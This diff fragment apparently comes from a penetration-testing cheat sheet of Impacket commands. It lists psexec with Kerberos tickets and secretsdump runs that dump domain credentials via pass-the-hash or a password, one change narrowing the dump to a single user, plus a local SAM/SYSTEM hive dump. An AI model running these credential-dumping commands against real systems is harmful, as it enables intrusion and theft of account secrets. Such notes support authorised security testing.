@@ -29,7 +29,7 @@ impacket-psexec -k -no-pass <HOSTNAME>.<ETC_HOST_FQDN> -dc-ip <DC_IP>
 
 # secretsdump
 impacket-secretsdump <DOMAIN>/<VICTIM>@<ETC_HOST_FQDN> -hashes <LMHASH>:<NTHASH>
-impacket-secretsdump <DOMAIN>/<VICTIM>:<PASS>@<ETC_HOST_FQDN>
+impacket-secretsdump <DOMAIN>/<VICTIM>:<PASS>@<ETC_HOST_FQDN> -just-dc-user <SINGLE_USER>
 
 # secretsdump SAM SYSTEM locally
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
